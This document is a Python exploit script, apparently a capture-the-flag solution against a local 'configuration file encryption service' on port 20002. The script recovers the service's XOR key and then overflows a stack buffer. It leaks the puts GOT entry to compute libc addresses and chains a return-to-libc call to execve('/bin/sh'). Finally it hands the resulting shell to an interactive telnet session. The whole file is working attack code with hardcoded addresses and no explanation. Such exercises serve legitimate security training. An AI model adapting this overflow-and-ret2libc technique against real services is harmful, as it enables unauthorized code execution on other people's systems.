import struct
import socket
import telnetlib

success_message = "[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n"


def p(x):
    return struct.pack("<I", x)


def welcome_message(fd):
    """ consume welcome message"""
    msg = "[-- Enterprise configuration file encryption service --]\n"
    return fd.read(len(msg))


def xor(value, key):
    """xor value by key"""
    return "".join([chr(ord(e) ^ ord(key[i % len(key)])) for i, e in enumerate(value)])


def get_key(fd):
    d = "A" * 128
    return xor(d, encrypt_data(fd, d))


def encrypt_data(fd, data):
    """send data to server"""
    fd.write("E" + p(len(data)) + data)
    fd.read(len(success_message))
    data_len, _ = struct.unpack("<I", fd.read(4))
    return fd.read(data_len)


buf_size = 32 * 4096 + 16
encrypt_file_addr = p(0x080497F7)
puts_got_addr = p(0x0804B3B8)


def read_addr(fd, key, addr, size):
    """read arbitrary address"""
    nwrite_address = p(0x80495A0)
    stdout = p(1)
    data = "A" * buf_size
    data += nwrite_address
    data += encrypt_file_addr
    data += stdout
    data += addr
    data += p(size)
    encrypt_data(fd, xor(data, key))
    fd.write("Q")
    return fd.read(size)


def exploit(fd, key):
    puts_addr = struct.unpack("<I", read_addr(fd, key, p(0x0804B3B8), 4))[0]
    welcome_message(fd)
    execve_addr = p(puts_addr + (0xB7782910 - 0xB77473B0))
    bin_sh_addr = p(puts_addr + (0xB781F8DA - 0xB77473B0))
    data = "A" * buf_size
    data += execve_addr
    data += p(0xDEADBEEF)
    data += bin_sh_addr
    data += p(0)
    data += p(0)
    encrypt_data(fd, xor(data, key))
    fd.write("Q")


IP = "127.0.0.1"
PORT = 20002

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
sock_fd = s.makefile("rw", bufsize=0)

welcome_message(sock_fd)
key = get_key(sock_fd)
exploit(sock_fd, key)

t = telnetlib.Telnet()
t.sock = s
t.interact()
